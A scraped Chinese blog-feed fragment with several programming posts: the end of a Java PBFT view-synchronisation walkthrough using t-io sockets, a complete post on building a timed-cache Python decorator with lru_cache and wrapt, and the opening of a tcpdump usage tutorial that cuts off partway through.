&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;既然我们使用socket通信，使用的是t-io框架。我们就从服务端和客户端的方面来理解这个view的获取过程。神笔马良来了！！&lt;/p&gt;

&lt;div class=&quot;story_image_container story_block_image&quot;&gt;
&lt;div class=&quot;story_image&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1439869/202002/1439869-20200221005551285-24188566.jpg&quot; alt=&quot;&quot; title=&quot;&quot; name=&quot;imgs/节点加入view同步.jpg&quot; data-src=&quot;./imgs/%E8%8A%82%E7%82%B9%E5%8A%A0%E5%85%A5view%E5%90%8C%E6%AD%A5.jpg&quot;/&gt;&lt;br/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;这个从socket的角度的解释下过程。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;首先区块链中的节点作为服务端，新加入的节点叫做客户端（遵循哲学态度，client发送请求询问server）。因为有多个server，因此对于&lt;code&gt;D节点&lt;/code&gt;来说，就需要多个客户端分别对应不同的服务端发送请求。然后服务端将view返回给client。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;然后说下代码，服务端接受到client发送的请求后，就将自己的view返回给client，然后client根据view的num决定哪一个才是真正的view。这里可以分为3个步骤：客户端请求view，服务端返回view，客户端处理view。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;客户端请求view：&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;pubView&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
        log.info(&lt;span class=&quot;hljs-string&quot;&gt;&quot;结点开始进行view同步操作&quot;&lt;/span&gt;);
        
        PbftMsg view = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; PbftMsg(MsgType.GET_VIEW, node.getIndex());
        
        ClientUtil.clientPublish(view);
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;
    }
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;上面的代码很简单，就是客户端向服务端广播PbftMsg，然后该消息的类型是GET_VIEW类型（也就是告诉大哥们，我是来请求view的）。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;既然客户端广播了PBFT消息，当然服务端就会接受到。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;下面是server端的代码，至于服务端是怎么接收到的，参考我的上一篇&lt;a href=&quot;https://www.cnblogs.com/xiaohuiduan/p/12302024.html&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;，或者别人的博客。当服务端接受到view的请求消息后，就会将自己的view发送给client。&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;13&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;onGetView&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(ChannelContext channelContext, PbftMsg msg)&lt;/span&gt; &lt;/span&gt;{
        log.info(&lt;span class=&quot;hljs-string&quot;&gt;&quot;server结点回复视图请求操作&quot;&lt;/span&gt;);
        &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; fromNode = msg.getNode();
        
        msg.setNode(node.getIndex());
        
        msg.setToNode(fromNode);
        
        msg.setViewNum(AllNodeCommonMsg.view);
        String jsonView = JSON.toJSONString(msg);
        MsgPacket msgPacket = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; MsgPacket();
        &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {
            msgPacket.setBody(jsonView.getBytes(MsgPacket.CHARSET));
            
            Tio.send(channelContext, msgPacket);
        } &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (UnsupportedEncodingException e) {
            log.error(String.format(&lt;span class=&quot;hljs-string&quot;&gt;&quot;server结点发送view消息失败%s&quot;&lt;/span&gt;, e.getMessage()));
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;然后是client接受到server返回的消息，然后进行处理。&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getView&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(PbftMsg msg)&lt;/span&gt; &lt;/span&gt;{
        
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (node.isViewOK()) {
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt;;
        }
        
        &lt;span class=&quot;hljs-keyword&quot;&gt;long&lt;/span&gt; count = collection.getViewNumCount().incrementAndGet(msg.getViewNum());
        
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (count &amp;gt;= &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * AllNodeCommonMsg.getMaxf() + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; !node.isViewOK()) {
            collection.getViewNumCount().clear();
            node.setViewOK(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);
            AllNodeCommonMsg.view = msg.getViewNum();
            log.info(&lt;span class=&quot;hljs-string&quot;&gt;&quot;视图初始化完成OK&quot;&lt;/span&gt;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_1&quot;&gt;在这里大家可能会发现一个问题，我在第二个if中还是使用了&lt;code&gt;!node.isViewOK()&lt;/code&gt;。那是因为我发现在多线程的情况下，即使view设置为true了，下面的代码还是会执行，也就是说&lt;code&gt;log.info(&quot;视图初始化完成OK&quot;);&lt;/code&gt;会执行两次，因此我又加了一个view检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;同样，我们可以来实现一下视图变更（ViewChange）的算法。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;什么时候会产生viewChange呢？当然是主节点失效的时候，就会进行viewchange的执行。当某一个节点发现主节点失效时（也即是断开连接的时候），他就会告诉所有的节点（进行广播）：啊！！不好了，主节点GG了，让我们重新选择一个主节点吧。因此，当节点收到quorum个重新选举节点的消息时，他就会将改变自己的视图。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;这里有一个前提，就是当主节点和客户端断开的时候，客户端会察觉到。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;client的代码：&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;重新选举view就是将目前的veiw+1，然后讲该view广播出去。&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;onChangeView&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(PbftMsg msg)&lt;/span&gt; &lt;/span&gt;{
        
        &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; viewNum = AllNodeCommonMsg.view + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;
        msg.setViewNum(viewNum);
        ClientUtil.clientPublish(msg);
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;服务端代码：&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;服务端代码和前面的的代码很类似。&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;changeView&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(ChannelContext channelContext, PbftMsg msg)&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (node.isViewOK()) {
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt;;
        }
        &lt;span class=&quot;hljs-keyword&quot;&gt;long&lt;/span&gt; count = collection.getViewNumCount().incrementAndGet(msg.getViewNum());

        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (count &amp;gt;= &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * AllNodeCommonMsg.getMaxf() + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; !node.isViewOK()) {
            collection.getViewNumCount().clear();
            node.setViewOK(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);
            AllNodeCommonMsg.view = msg.getViewNum();
            log.info(&lt;span class=&quot;hljs-string&quot;&gt;&quot;视图变更完成OK&quot;&lt;/span&gt;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h3&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;总结&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;在这里，大家可能会有个疑惑，为什么进行广播消息不是使用服务端去广播消息，反而是使用client一个一个的去广播消息。原因有一下两点：&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_2&quot;&gt;因为没有购买t-io文档，因此我也不知道server怎么进行广播消息。因为它取消了学生优惠，现在需要699￥，实在是太贵了（当然这个贵是针对与我而言的，不过这个框架还是真的挺好用的）舍不得买。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_2&quot;&gt;为了是思路清晰，client就是为了请求数据，而server就是为了返回数据。这样想的时候，不会是自己的思路断掉&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;在这里为止，我们就简单的实现了节点加入和view的变迁（当然是最简单的实现，emm，大佬勿喷）。在下篇博客中，我将会介绍共识过程的实现。如果这篇博客有错误的地方，望大佬指正。可以在评论区留言或者邮箱联系。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;项目地址：&lt;a href=&quot;https://github.com/xiaohuiduan/pbft&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;GitHub&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 20 Feb 2020 16:56:00 +0000</pubDate>
<dc:creator>段小辉</dc:creator>
<og:description>PBFT 算法的java实现（上） 在这篇博客中，我会通过Java 去实现PBFT中结点的加入，以及认证。其中使用socket实现网络信息传输。 关于PBFT算法的一些介绍，大家可以去看一看网上的博客</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xiaohuiduan/p/12339955.html</dc:identifier>
</item>
<item>
<title>假装优雅地实现定时缓存装饰器 - AdjWang</title>
<link>http://www.cnblogs.com/adjwang/p/12329545.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/adjwang/p/12329545.html</guid>
<description>&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/piglei/one-python-craftsman/blob/master/zh_CN/8-tips-on-decorators.md&quot;&gt;Python 工匠：使用装饰器的技巧&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI2MzEwNTY3OQ==&amp;amp;mid=2648978127&amp;amp;idx=1&amp;amp;sn=6305d72a4d6c306275d87bc2c0a44a82&quot;&gt;一日一技：实现有过期时间的LRU缓存&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这次的参考资料写在前面，因为写得真不错！开始阅读本篇分享前，建议先阅读参考资料，如果还不能实现定时缓存装饰器，再继续从这里开始读。&lt;/p&gt;

&lt;p&gt;功能拆分:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;缓存上次函数运行的结果一段时间。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;把它封装成装饰器。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;定时缓存&quot;&gt;定时缓存&lt;/h2&gt;
&lt;p&gt;众所周知，python的&lt;code&gt;functools&lt;/code&gt;库中有&lt;code&gt;lru_cache&lt;/code&gt;用于构建缓存，而函数参数就是缓存的&lt;code&gt;key&lt;/code&gt;，因此，只要把缓存空间设置为&lt;code&gt;1&lt;/code&gt;，用时间值作为&lt;code&gt;key&lt;/code&gt;，即可实现定时执行函数。细节就去看参考资料2吧，我这里就不赘述了。&lt;br/&gt;具体实现如下:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;&quot;&quot;&quot; 定时执行delay_cache &quot;&quot;&quot;
import time
from functools import lru_cache

def test_func():
    print('running test_func')
    return time.time()

@lru_cache(maxsize=1)
def delay_cache(_):
    return test_func()


if __name__ == &quot;__main__&quot;:
    for _ in range(10):
        print(delay_cache(time.time()//1))    # 1s
        time.sleep(0.2)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;程序输出:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;running test_func
1582128027.6396878
1582128027.6396878
running test_func
1582128028.0404685
1582128028.0404685
1582128028.0404685
1582128028.0404685
1582128028.0404685
running test_func
1582128029.0425367
1582128029.0425367
1582128029.0425367&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，&lt;code&gt;test_func&lt;/code&gt;在距上次调用&lt;code&gt;1s&lt;/code&gt;内直接输出缓存结果，调用间隔超过&lt;code&gt;1s&lt;/code&gt;时&lt;code&gt;test_func&lt;/code&gt;才会被真正执行。&lt;br/&gt;手动实现缓存需要用字典，这里用&lt;code&gt;lru_cache&lt;/code&gt;装饰器代替了复杂的字典实现，就很优雅;-)&lt;/p&gt;
&lt;h2 id=&quot;装饰器&quot;&gt;装饰器&lt;/h2&gt;
&lt;p&gt;装饰器的作用呢，就是给函数戴顶帽子，然后函数该干嘛干嘛去，然而别人看见的已经不是原来的函数，而是戴帽子的函数了。哈哈。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;@delay_cache(time.time()//1)    # (midori)帽子
def test_func():
    print('running test_func')
    return time.time()&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;一个错误的示范&quot;&gt;一个错误的示范&lt;/h3&gt;
&lt;p&gt;实现这个&lt;code&gt;delay_cache&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;...
import wrapt
...
def delay_cache(t):
    @wrapt.decorator
    def wrapper(func, isinstance, args, kwargs):
        # 给func加缓存
        @lru_cache(maxsize=1)
        def lru_wrapper(t):
            return func()
        return lru_wrapper(t)
    return wrapper
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行这段程序，就会得到错误的结果……(嘿嘿)&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;test 1582129926.0
running test_func
1582129926.4459314
test 1582129926.0
running test_func
1582129926.6466658
test 1582129926.0
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，定时缓存好像消失了一样。原因是&lt;strong&gt;装饰器返回的是&lt;code&gt;wrapper&lt;/code&gt;函数，而参数&lt;code&gt;t&lt;/code&gt;被&lt;code&gt;wrapper&lt;/code&gt;函数排除在外了。&lt;/strong&gt;用&lt;code&gt;print&lt;/code&gt;打印&lt;code&gt;t&lt;/code&gt;，就会发现&lt;code&gt;t&lt;/code&gt;一直没有变。&lt;br/&gt;等等，如果&lt;code&gt;t&lt;/code&gt;不变，那不应该是一直取缓存结果吗？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;现实总是残酷的，&lt;strong&gt;&lt;code&gt;wrapper&lt;/code&gt;函数返回的是&lt;code&gt;lru_wrapper(t)&lt;/code&gt;，是一个结果，而不是&lt;code&gt;lru_wrapper&lt;/code&gt;函数，&lt;/strong&gt;于是可怜的&lt;code&gt;lru_cache&lt;/code&gt;跟着执行完的&lt;code&gt;lru_wrapper&lt;/code&gt;，被扔进了垃圾桶，从此被永远遗忘。等到下一次执行到这里，尽管新的&lt;code&gt;t&lt;/code&gt;相同，但是&lt;code&gt;lru_cache&lt;/code&gt;也是新的，它根本不记得自己曾经与&lt;code&gt;t&lt;/code&gt;还有过一段美好的姻缘过往……&lt;br/&gt;证据呢？如果你也和我一样八卦的话，就去搞个全局变量，在&lt;code&gt;lru_wrapper&lt;/code&gt;首次运行的时候把它存下来，后面的调用就全靠这个全局变量，然后输出结果就不变了。(要记得&lt;strong&gt;只需要在&lt;code&gt;lru_wrapper&lt;/code&gt;首次运行的时候把函数赋值给全局变量！&lt;/strong&gt;)&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;现实总是残酷的×2，就算证明了&lt;code&gt;lru_cache&lt;/code&gt;和&lt;code&gt;t&lt;/code&gt;隔世的姻缘，我们的需求也不会实现，因为之前说过，参数&lt;code&gt;t&lt;/code&gt;被&lt;code&gt;wrapper&lt;/code&gt;函数排除在外了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果不把&lt;code&gt;t&lt;/code&gt;作为装饰器的参数，而作为被装饰函数的参数呢？功能倒是实现了，可是装饰器失去了它的价值，而且每个用户函数，比如这里的&lt;code&gt;test_func&lt;/code&gt;，都要加上时间计算，变成&lt;code&gt;test_func(time.time()//1, ...):&lt;/code&gt;，到时候&lt;code&gt;time&lt;/code&gt;模块满天飞，难以直视，惨不忍睹。&lt;/p&gt;
&lt;h3 id=&quot;正解&quot;&gt;正解&lt;/h3&gt;
&lt;p&gt;用类来做装饰器，类实例化以后就可以一直相伴&lt;code&gt;lru_cache&lt;/code&gt;左右，为它保驾护航。有关类装饰器的内容看参考资料1&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class DelayCache(object):
    def __init__(self, delay_s):
        self.delay_s = delay_s
    
    @wrapt.decorator
    def __call__(self, func, isinstance, args, kwargs):
        self.func = func
        self.args, self.kwargs = args, kwargs
        hashable_arg = pickle.dumps((time.time()//self.delay_s, args, kwargs))
        return self.delay_cache(hashable_arg)

    @lru_cache(maxsize=1)
    def delay_cache(self, _):
        return self.func(*self.args, **self.kwargs)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;新的帽子做好了，给函数戴上试试看:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;...
@DelayCache(1)      # 缓存 1s
def test_func(_):
    print('running test_func')
    return time.time()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试下效果:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;if __name__ == &quot;__main__&quot;:
    for _ in range(10):
        print(test_func(1))     # 只取定时缓存
        time.sleep(0.2)
# 测试结果:  
# running test_func     # 首次运行定时不是设定的1s，下面给出解决方案
# 1582132259.4029999
# 1582132259.4029999
# 1582132259.4029999
# running test_func
# 1582132260.0045283
# 1582132260.0045283
# 1582132260.0045283
# 1582132260.0045283
# 1582132260.0045283
# running test_func
# 1582132261.0072334
# 1582132261.0072334&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;if __name__ == &quot;__main__&quot;:
    for i in range(10):
        print(test_func(i))     # 每次都执行函数
        time.sleep(0.2)
# 测试结果:  
# running test_func
# 1582132434.0865102
# running test_func
# 1582132434.2869732
# running test_func
# 1582132434.4875488
# ...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;哈哈，这下终于搞定了。不过又冒出来2个问题:&lt;/p&gt;
&lt;ol readability=&quot;15&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;首次运行的定时值并不是&lt;code&gt;1s&lt;/code&gt;。&lt;br/&gt;函数每次开始计时的时间点都是随机的，而缓存更新却依靠秒进位，所以首次运行的缓存时间可能是&lt;code&gt;0~1s&lt;/code&gt;内任意一个时间点到&lt;code&gt;1s&lt;/code&gt;，所以不准。要解决这个问题，就要让时间从&lt;code&gt;0&lt;/code&gt;开始计时。我的做法是用一个&lt;code&gt;self.start_time&lt;/code&gt;属性记录函数首次运行的时间，然后计算实际间隔的时候，用取到的时间减去这个记录值，这样起始时间就一定从&lt;code&gt;0&lt;/code&gt;开始了。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;28&quot;&gt;
&lt;p&gt;参数改变的时候计时没有复位。&lt;br/&gt;需要复位的地方就是执行&lt;code&gt;delay_cache&lt;/code&gt;的地方，所以在&lt;code&gt;delay_cache&lt;/code&gt;函数里复位计时值即可。&lt;br/&gt;另外，每次复位后，&lt;code&gt;(time.time() - self.start_time)&lt;/code&gt;都重新从&lt;code&gt;0&lt;/code&gt;开始累加，&lt;code&gt;(time.time() - self.start_time) // self.delay_s&lt;/code&gt;的输出会变成&lt;code&gt;...0,1,0,0,0,0,1,0,0,0,0,1,0,0...&lt;/code&gt;，这样就不能作为&lt;code&gt;lru_cache&lt;/code&gt;的&lt;code&gt;key&lt;/code&gt;来判定了，所以添加一个&lt;code&gt;self.tick&lt;/code&gt;属性，把状态锁住，变成&lt;code&gt;...0,0,1,1,1,1,1,0,0,0,0,0,1,1...&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;改动的地方直接看最终代码吧。&lt;/p&gt;

&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import time
import pickle
import wrapt
from functools import lru_cache

class DelayCache(object):
    def __init__(self, delay_s):
        self.delay_s = delay_s
        self.start_time = 0
        self.tick = 0
    
    @wrapt.decorator
    def __call__(self, func, instance, args, kwargs):
        self.func = func
        self.args, self.kwargs = args, kwargs
        if time.time() - self.start_time &amp;gt; self.delay_s:
            self.tick ^= 1          # 状态切换，相当于自锁开关
        hashable_arg = pickle.dumps((self.tick, args, kwargs))
        return self.delay_cache(hashable_arg)

    @lru_cache(maxsize=1)
    def delay_cache(self, _):
        self.start_time = time.time()       # 计时复位
        return self.func(*self.args, **self.kwargs)

@DelayCache(delay_s=1)  # 缓存1秒
def test_func(arg):
    print('running test_func')
    return arg

if __name__ == &quot;__main__&quot;:
    for i in [1, 1, 2, 3, 1, 1, 1, 1, 1, 1, 1, 1]:
        print(test_func(i))
        time.sleep(0.4)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;用&lt;code&gt;@wrapt.decorator&lt;/code&gt;抵制套娃，用&lt;code&gt;@lru_cache&lt;/code&gt;干掉字典，代码变得异常清爽啊……&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;running test_func
1
1
running test_func
2
running test_func
3
running test_func
1
1
1
running test_func
1
1
1
running test_func
1
1&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Thu, 20 Feb 2020 16:47:00 +0000</pubDate>
<dc:creator>AdjWang</dc:creator>
<og:description>参考资料 1. &amp;quot;Python 工匠：使用装饰器的技巧&amp;quot; 2. &amp;quot;一日一技：实现有过期时间的LRU缓存&amp;quot; 这次的参考资料写在前面，因为写得真不错！开始阅读本篇分</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/adjwang/p/12329545.html</dc:identifier>
</item>
<item>
<title>Linux tcpdump 命令详解与示例 - 踏歌行666</title>
<link>http://www.cnblogs.com/zhanglianghhh/p/12339731.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhanglianghhh/p/12339731.html</guid>
<description>

&lt;p&gt;Linux作为网络服务器，特别是作为路由器和网关时，数据的采集和分析是不可少的。TcpDump 是 Linux 中强大的网络数据采集分析工具之一。&lt;/p&gt;
&lt;p&gt;用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。&lt;/p&gt;
&lt;p&gt;作为互联网上经典的的系统管理员必备工具，tcpdump以其&lt;span&gt;&lt;strong&gt;强大的功能，灵活的截取策略&lt;/strong&gt;&lt;/span&gt;，成为每个高级的系统管理员分析网络，排查问题等所必备的工具之一。&lt;/p&gt;
&lt;p&gt;TCPDump可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。&lt;/p&gt;


&lt;p&gt;查看当前机器有哪些网络接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; # tcpdump -&lt;span&gt;D
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;.eth0
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;2&lt;/span&gt;&lt;span&gt;.nflog (Linux netfilter log (NFLOG) interface)
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;3&lt;/span&gt;&lt;span&gt;.nfqueue (Linux netfilter queue (NFQUEUE) interface)
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;.eth1
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; &lt;span&gt;5&lt;/span&gt;.usbmon1 (USB bus number &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; &lt;span&gt;6&lt;/span&gt;.any (Pseudo-&lt;span&gt;device that captures on all interfaces)
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; &lt;span&gt;7&lt;/span&gt;.lo [Loopback]
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;下面所有测试中都有 -i any的选项，表示抓取所有网络接口上的包，为了让测试方便&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;针对指定主机抓包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn host &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;1.10&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; ./$(&lt;span&gt;date&lt;/span&gt; +%Y%m%d%H%M%S).pcap
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;针对指定端口抓包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn port &lt;span&gt;80&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; ./$(&lt;span&gt;date&lt;/span&gt; +%Y%m%d%H%M%S).pcap
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;针对主机和端口抓包，两者关系 and&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn host &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;1.10&lt;/span&gt; and port &lt;span&gt;80&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; ./$(&lt;span&gt;date&lt;/span&gt; +%Y%m%d%H%M%S).pcap
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;针对多个端口抓包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
